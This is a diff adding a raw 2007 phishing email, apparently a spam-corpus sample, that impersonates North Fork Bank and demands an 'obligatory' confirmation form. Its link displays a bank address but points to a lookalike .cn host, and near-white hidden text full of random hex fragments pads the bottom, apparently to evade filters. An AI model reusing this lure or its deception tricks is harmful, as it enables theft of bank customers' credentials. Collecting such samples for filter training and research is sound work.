@@ -1,0 +1,64 @@
+Return-Path: <clientdepmnt.reftc42977739e.nf@northforkbank.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id D11CB2A895
+	for <user@example.com>; Sun,  8 Jul 2007 16:14:04 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+	by mail.example.com (Example mail relay) with ESMTP id 8540F621C9A
+	for <user@example.com>; Sun,  8 Jul 2007 16:14:04 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id B5E1D16253; Sun,  8 Jul 2007 16:17:06 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from eu83-213-140-26.clientes.euskaltel.es (eu83-213-140-26.clientes.euskaltel.es [83.213.140.26])
+	by mail.example.com (Example mail relay) with SMTP id 3FCFA1624C
+	for <user@example.com>; Sun,  8 Jul 2007 16:16:40 -0400 (EDT)
+Received: from brutal.pacbell.net (unknown [66.44.108.44])
+       by ignum.com with SMTP id 3E2PJPXSKV
+       for <user@example.com>; Sun, 08 Jul 2007 13:13:35 -0800
+X-OriginalArrivalTime: Sun, 08 Jul 2007 13:13:35 -0800
+From: "North Fork Bank" <clientdepmnt.reftc42977739e.nf@northforkbank.com>
+To: user <user@example.com>
+Subject: North Fork Bank client service team: online banking form! (mess_id: jy07900612515)
+X-OriginalArrivalTime: Sun, 08 Jul 2007 13:13:35 -0800
+User-Agent: Mozilla 4.61 [en]C-CCK-MCD C-UDP; (Win98; I)
+X-Mailer: Mozilla 4.61 [en]C-CCK-MCD C-UDP; (Win98; I)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--Z2PJNCYR7QFPXLRV"
+Message-Id: <20070708201642.3FCFA1624C@mail.example.com>
+Date: Sun,  8 Jul 2007 16:16:40 -0400 (EDT)
+X-Keywords:                  
+Status: O
+Content-Length: 3387
+Lines: 28
+
+----Z2PJNCYR7QFPXLRV
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta   http-equiv="Content-Type"   content="text/html;    charset=iso-8859-1">
+</head>
+
+<body>
+<p><font      face="Arial">Dear  North     Fork     Bank  customer,</font></p>
+<p><font   face="Arial">North  Fork       Client   Service       Team requests     you      to     complete       the      Customer      Confirmation   Form       (CCF).</font></p>
+<p><font    face="Arial">This       procedure     is  obligatory      for     all   business    and corporate clients  of       North  Fork    Bank.</font></p>
+<p><font face="Arial">Please      click    hyperlink   below to    access   Customer  Confirmation   Form    (CCF).</font><br>
+</p>
+<p><font    face="Arial"><a    href="http://nfbconnect-810516.northforkbank.com.dllstack.cn/cashman/banking/ccf.asp">http://nfbconnect-810516.northforkbank.com/cashman/banking/ccf.asp</a></font></p>
+<p><font face="Arial">Thank you      for     choosing  North    Fork Bank       for   your     banking      needs.</font></p>
+<p><font       face="Arial">!  Please     do not      respond     to   this     email.</font></p>
+<p><font     face="Arial">This       mail    generated       by      an     automated   service.</font><br>
+</p>
+<p>=====================================================================================================</p>
+<p><font     color="#FFFFF6"     face="Arial">start: 0x60, 0x762, 0x86345227, 0x780, 0x53, 0x24633839, 0x35563979, 0x896, 0x12845205, 0x38686803    hex start F90C.  0x05, 0x9600, 0x5357, 0x1, 0x17       CKGG: 0x233, 0x18, 0x24813555, 0x88, 0x05381533, 0x3019, 0x555, 0x63, 0x3187, 0x01, 0x1838, 0x3581, 0x730  0x3, 0x04016241, 0x5863, 0x6194, 0x181, 0x462, 0x258, 0x7, 0x368, 0x8, 0x41800685      stack: 0x37, 0x100     ITK: 0x379    2FC: 0x90   root: 0x17234725, 0x62, 0x374, 0x9472, 0x95417710, 0x4, 0x804, 0x7, 0x1, 0x7136</font></p><p><font      color="#FFFFF1"  face="Arial"><span>type: 0x9862, 0x77822231, 0x780, 0x2269, 0x1, 0x57, 0x08988751     file: 0x63, 0x4455, 0x95801974, 0x28510724, 0x668, 0x5116 0x12, 0x9080, 0x49, 0x158, 0x1831, 0x7, 0x688, 0x0187, 0x8, 0x4694       4C1 RYK api 1LUI tmp dec media common MP12.  0x14, 0x327, 0x58697937, 0x0876, 0x8, 0x032, 0x04, 0x59266723, 0x06376167, 0x27, 0x04, 0x4946    0x9, 0x6, 0x4321, 0x9, 0x5, 0x0279 </span><span>URZS ZUE functio
+ n      T5Q: 0x627, 0x55, 0x794, 0x15, 0x67401121, 0x6179, 0x643, 0x51, 0x06, 0x16692011   SUQE: 0x7048, 0x7362, 0x9, 0x73935864, 0x3, 0x2, 0x3323, 0x68892773, 0x93508140, 0x13482022, 0x035, 0x4373, 0x48      0x020, 0x9286, 0x75550357, 0x62, 0x9710, 0x3923, 0x97, 0x210, 0x6194, 0x85289055, 0x5</span></font></p>
+<p><font color="#FFFFF7"    face="Arial"><span>0x14069442, 0x8164, 0x68161366, 0x4029, 0x18686050, 0x44, 0x478, 0x4080     cvs: 0x99, 0x16866905, 0x25, 0x377, 0x578, 0x6  0x834, 0x1780, 0x35, 0x4562, 0x56470614, 0x2016, 0x53, 0x05710106, 0x0552, 0x317, 0x0, 0x2, 0x164, 0x32910666, 0x1953   QAJM: 0x49, 0x04       close 1HQ common JF87 5W0 serv CLTE</span><span>create: 0x38681928, 0x3, 0x7558, 0x001, 0x64, 0x28589131, 0x9, 0x82, 0x726, 0x158, 0x81, 0x24      </span><span>0x69, 0x780, 0x7, 0x24  0x4, 0x77, 0x7, 0x46199646, 0x026, 0x8755, 0x85786941, 0x69     GJV     ERB: 0x5000, 0x9, 0x718, 0x0, 0x6, 0x022, 0x676, 0x158, 0x8358, 0x78728361</span></font></p>
+</body>
+</html>
+
+
+----Z2PJNCYR7QFPXLRV--
+
